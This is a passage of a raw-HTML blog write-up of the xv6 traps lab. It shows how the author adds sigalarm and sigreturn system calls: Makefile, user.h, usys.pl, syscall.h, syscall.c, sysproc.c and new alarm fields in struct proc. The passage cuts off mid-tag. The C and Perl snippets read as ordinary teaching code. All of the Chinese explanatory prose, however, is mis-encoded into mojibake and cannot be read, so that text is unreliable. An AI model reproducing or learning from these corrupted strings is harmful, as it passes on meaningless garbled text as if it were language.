¸ä»¥è·³è½¬åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„è­¦æŠ¥å¤„ç†ç¨‹åº</p><p>å…ˆä¿®æ”¹makefileç¼–è¯‘å‡ºalarmtest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_alarmtest\<br></code></pre></td></tr></table></figure><p>æ”¾å…¥ user/user.h ä¸­çš„æ­£ç¡®å£°æ˜:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// system calls</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((noreturn))</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kill</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span>**)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mknod</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">short</span>, <span class="hljs-keyword">short</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">// ulib.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">stat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strcpy</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memmove</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strchr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span> c)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span> max)</span></span>;<br><span class="hljs-function">uint <span class="hljs-title">strlen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">malloc</span><span class="hljs-params">(uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">atoi</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">memcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memcpy</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br></code></pre></td></tr></table></figure><p>æ›´æ–° user/usys.pl (ç”Ÿæˆ user/usys.S)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/perl -w<br><br># Generate usys.S, the stubs <span class="hljs-keyword">for</span> syscalls.<br><br>print <span class="hljs-string">&quot;# generated by usys.pl - do not edit\n&quot;</span>;<br><br>print <span class="hljs-string">&quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;</span>;<br><br>sub entry &#123;<br>    my $name = shift;<br>    print <span class="hljs-string">&quot;.global $name\n&quot;</span>;<br>    print <span class="hljs-string">&quot;$&#123;name&#125;:\n&quot;</span>;<br>    print <span class="hljs-string">&quot; li a7, SYS_$&#123;name&#125;\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ecall\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ret\n&quot;</span>;<br>&#125;<br><br>entry(<span class="hljs-string">&quot;fork&quot;</span>);<br>entry(<span class="hljs-string">&quot;exit&quot;</span>);<br>entry(<span class="hljs-string">&quot;wait&quot;</span>);<br>entry(<span class="hljs-string">&quot;pipe&quot;</span>);<br>entry(<span class="hljs-string">&quot;read&quot;</span>);<br>entry(<span class="hljs-string">&quot;write&quot;</span>);<br>entry(<span class="hljs-string">&quot;close&quot;</span>);<br>entry(<span class="hljs-string">&quot;kill&quot;</span>);<br>entry(<span class="hljs-string">&quot;exec&quot;</span>);<br>entry(<span class="hljs-string">&quot;open&quot;</span>);<br>entry(<span class="hljs-string">&quot;mknod&quot;</span>);<br>entry(<span class="hljs-string">&quot;unlink&quot;</span>);<br>entry(<span class="hljs-string">&quot;fstat&quot;</span>);<br>entry(<span class="hljs-string">&quot;link&quot;</span>);<br>entry(<span class="hljs-string">&quot;mkdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;chdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;dup&quot;</span>);<br>entry(<span class="hljs-string">&quot;getpid&quot;</span>);<br>entry(<span class="hljs-string">&quot;sbrk&quot;</span>);<br>entry(<span class="hljs-string">&quot;sleep&quot;</span>);<br>entry(<span class="hljs-string">&quot;uptime&quot;</span>);<br>entry(<span class="hljs-string">&quot;sigalarm&quot;</span>);<span class="hljs-comment">//</span><br>entry(<span class="hljs-string">&quot;sigreturn&quot;</span>);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p> kernel/syscall.h </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// System call numbers</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fork    1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exit    2</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_wait    3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_pipe    4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_read    5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_kill    6</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exec    7</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fstat   8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_chdir   9</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_dup    10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_getpid 11</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sbrk   12</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sleep  13</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_uptime 14</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_open   15</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_write  16</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mknod  17</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_unlink 18</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_link   19</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mkdir  20</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_close  21</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigalarm 22</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigreturn 23</span><br></code></pre></td></tr></table></figure><p>kernel/syscall.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_chdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_close</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_dup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fstat</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_kill</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_link</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mknod</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_open</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_pipe</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sbrk</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_unlink</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_wait</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>[SYS_fork]    sys_fork,<br>[SYS_exit]    sys_exit,<br>[SYS_wait]    sys_wait,<br>[SYS_pipe]    sys_pipe,<br>[SYS_read]    sys_read,<br>[SYS_kill]    sys_kill,<br>[SYS_exec]    sys_exec,<br>[SYS_fstat]   sys_fstat,<br>[SYS_chdir]   sys_chdir,<br>[SYS_dup]     sys_dup,<br>[SYS_getpid]  sys_getpid,<br>[SYS_sbrk]    sys_sbrk,<br>[SYS_sleep]   sys_sleep,<br>[SYS_uptime]  sys_uptime,<br>[SYS_open]    sys_open,<br>[SYS_write]   sys_write,<br>[SYS_mknod]   sys_mknod,<br>[SYS_unlink]  sys_unlink,<br>[SYS_link]    sys_link,<br>[SYS_mkdir]   sys_mkdir,<br>[SYS_close]   sys_close,<br>[SYS_sigalarm] sys_sigalarm,<span class="hljs-comment">//</span><br>[SYS_sigreturn] sys_sigreturn,<span class="hljs-comment">//</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨sysproc.cä¸­åŠ å…¥sys_sigalarmå’Œsys_sigreturnå‡½æ•°å¤„ç†ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64 </span><br><span class="hljs-function"><span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint64 fn;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">1</span>, &amp;fn) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> sigalarm(n, (<span class="hljs-keyword">void</span>(*)())(fn));<br>&#125;<br><br><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> sigreturn();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å…³äºtest1çš„æç¤ºï¼š</p><ul><li>è§£å†³æ–¹æ¡ˆå°†è¦æ±‚æ‚¨ä¿å­˜å’Œæ¢å¤å¯„å­˜å™¨â€“ æ‚¨éœ€è¦ä¿å­˜å’Œæ¢å¤å“ªäº›å¯„å­˜å™¨æ‰èƒ½æ­£ç¡®åœ°æ¢å¤è¢«ä¸­æ–­çš„ä»£ç ï¼Ÿ(æç¤º: ä¼šæœ‰å¾ˆå¤š)ã€‚</li><li>å½“è®¡æ—¶å™¨å…³é—­æ—¶ï¼Œç”¨æˆ·é™·é˜±åœ¨ struct proc ä¸­ä¿å­˜è¶³å¤Ÿçš„çŠ¶æ€ï¼Œè¿™æ ·ç­¾åè¿”å›å°±å¯ä»¥æ­£ç¡®åœ°è¿”å›åˆ°è¢«ä¸­æ–­çš„ç”¨æˆ·ä»£ç ã€‚</li><li>é˜²æ­¢å¯¹å¤„ç†ç¨‹åºçš„é‡å…¥è°ƒç”¨â€”â€”å¦‚æœå¤„ç†ç¨‹åºè¿˜æ²¡æœ‰è¿”å›ï¼Œå†…æ ¸å°±ä¸åº”è¯¥å†æ¬¡è°ƒç”¨å®ƒã€‚</li></ul><p>ç¡¬ä»¶æ—¶é’Ÿæ¯æ¬¡éƒ½å¼ºåˆ¶æ‰§è¡Œä¸€ä¸ªä¸­æ–­ï¼Œè¿™ä¸ªä¸­æ–­åœ¨ kernel/trap.c ä¸­çš„ usertrap ()ä¸­å¤„ç†ã€‚æ¯æ¬¡æ—¶é’Ÿå‘ç”Ÿç¡¬ä»¶ä¸­æ–­ï¼Œéƒ½ç»Ÿè®¡ä¸€æ¬¡ï¼Œåˆ°äº†æ¬¡æ•°å°±æ‰§è¡Œhandler</p><p>åœ¨procä¸­åŠ å…¥å¦‚ä¸‹å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> alarm_interval; <span class="hljs-comment">//n in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">void</span>(*alarm_handler)();<span class="hljs-comment">// fn in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">int</span> alarm_ticks;<span class="hljs-comment">//after alarm_ticks will </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">saved_trapframe</span>;</span><br>  <span class="hljs-keyword">int</span> alarm_flag;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å®Œå–„sigalarmå’Œsigreturnå‡½æ•°ï¼Œå¹¶åœ¨defs.hä¸­åŠ å…¥å£°æ˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td 